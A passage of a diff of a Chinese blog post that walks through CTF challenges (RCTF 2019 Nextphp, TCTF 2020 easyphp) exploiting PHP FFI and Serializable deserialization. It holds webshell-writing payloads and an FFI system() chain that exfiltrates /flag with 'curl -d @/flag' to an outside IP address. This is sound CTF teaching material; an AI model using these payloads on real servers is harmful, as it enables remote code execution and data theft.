-<h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>进来看到是这个，我们先写个木马进去，链接<code>antsword</code></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=file_put_contents(&quot;shell.php&quot;,&#x27;木马内容自己写&#x27;);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=file_put_contents(&quot;shell.php&quot;,&#x27;木马内容自己写&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p>进来之后拿到了这个<code>preload.php</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>PHP Serializable是自定义序列化的接口。实现此接口的类将不再支持__sleep()和__wakeup()。</p>
@@ -628,521 +256,253 @@
 <p>当类的实例对象被反序列化时，将调用unserialize()方法，并且不执行__destruct()。如果对象实现理Serialize接口，接口的unserialize()方法将被忽略，并使用__unserialize()代替。</p>
 </blockquote>
 <p>我们先调试一下序列化的情况可以看到直接就走到了<code>__serialize()</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143151.png"
-                      alt="1"
-                ></p>
+<p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143151.png" alt="1"></p>
 <p>就跳出来了，再看看反序列化的情况，可以看到是直接跳到了<code>__unserialize()</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143400.png"
-                      alt="1"
-                ></p>
+<p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-143400.png" alt="1"></p>
 <p>此时我们如果注释这两个方法的话，进行调试看看呢，可以看到就是走的<code>serialize</code>和<code>unserialize</code>，嗯，那么我们看看怎么利用FFI来打这个，首先要触发反序列化，那么我们就要走<code>unserialize</code>，那么写个<code>exp</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(const char *command);&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(const char *command);&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
 
 <p>然后我们再调用<code>__serialize()</code>方法来返回执行结果，这里是外带flag，payload是这样子</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;curl -d @/flag 27.25.151.48:9999&#x27;);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;curl -d @/flag 27.25.151.48:9999&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p>可能晕的地方就是命令执行这里其实</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;ret&#x27;</span>]-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl -d @/flag 27.25.151.48:9999&#x27;</span>);</span><br><span class="line"><span class="comment"># 这个和下面是一样的</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl -d @/flag 27.25.151.48:8888&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;ret&#x27;</span>]-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl -d @/flag 27.25.151.48:9999&#x27;</span>);</span><br><span class="line"><span class="comment"># 这个和下面是一样的</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl -d @/flag 27.25.151.48:8888&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <h3 id="TCTF-2020-easyphp"><a href="#TCTF-2020-easyphp" class="headerlink" title="TCTF 2020 easyphp"></a>TCTF 2020 easyphp</h3><p>进来之后还是经典的东西</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GEt</span>[<span class="string">&#x27;rh&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GEt</span>[<span class="string">&#x27;rh&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GEt</span>[<span class="string">&#x27;rh&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GEt</span>[<span class="string">&#x27;rh&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以直接phpinfo看到一些信息但是都不重要重要的是，我们先写马一样的方法，然后链接antsword，这里我们也得到了信息是<strong>php7.4.5</strong></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$file_list</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$file_list</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们先利用原生类读取根目录发现一个<code>flag.h</code>和<code>flag.so</code>，那么看了之前的知识点很容易想到用FFI来加载h文件达到目的，进antsword看看h文件里面写了什么</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(file_get_contents(&quot;/flag.h&quot;));</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(file_get_contents(&quot;/flag.h&quot;));</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-162320.png"
-                      alt="1"
-                ></p>
+<p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-162320.png" alt="1"></p>
 <p>直接调用就可以了，写个exp</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">flag_fUn3t1on_fFi</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(FFI::<span class="keyword">string</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">load</span>(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">flag_fUn3t1on_fFi</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(FFI::<span class="keyword">string</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
 
 <p>就好了</p>
 <h3 id="noeasyphp-revenge"><a href="#noeasyphp-revenge" class="headerlink" title="noeasyphp(revenge)"></a>noeasyphp(revenge)</h3><p>不过刚才那一道好像是非预期了，不会让我们那么容易拿到flag</p>
 <p>还是写马然后看目录</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#x27;glob:///*&#x27;));</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#x27;glob:///*&#x27;));</span><br></pre></td></tr></table></figure>
 
 <p>然后拿到了<code>flag.h</code>和<code>flag.so</code>，但是没有函数让我们看函数名了</p>
 <p>查找FFI官方文档会发现有很多与内存有很多相关的函数，我们这里使用内存泄露来获取函数名</p>
 <p>exp</p>
